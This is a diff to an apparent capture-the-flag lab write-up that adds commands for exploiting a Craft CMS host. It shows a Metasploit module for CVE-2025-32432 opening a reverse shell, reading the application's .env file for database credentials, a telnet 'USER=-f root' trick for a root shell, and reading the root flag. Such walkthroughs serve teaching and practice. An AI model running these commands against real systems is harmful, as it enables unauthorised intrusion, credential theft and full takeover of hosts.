@@ -46,11 +46,29 @@ A Metasploit module already exists for this vulnerability, so let's use it.
 
 ```bash
 msfconsole -q
+
+use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
+
+set RHOSTS MACHINE_IP
+
+set LHOST YOUR_IP
+
+set LPORT 4444
+
+run
 ```
 
 ![](images/Pasted%20image%2020260630231105.png)
 
 After getting a shell, a bit of manual enumeration leads us to the application's database credentials.
+
+```bash
+cd ~/html/craft
+
+ls -la
+
+cat .env
+```
 
 ![](images/Pasted%20image%2020260630231253.png)
 
@@ -110,9 +128,13 @@ Exploiting the vulnerability is straightforward:
 USER="-f root" telnet -a 127.0.0.1
 ```
 
-The exploit immediately drops us into a root shell.
+When typing the command on top, the exploit immediately drops us into a root shell.
 
 All that's left is retrieving the root flag.
+
+```bash
+cat /root/root.txt
+```
 
 ![](images/Pasted%20image%2020260630235853.png)
 
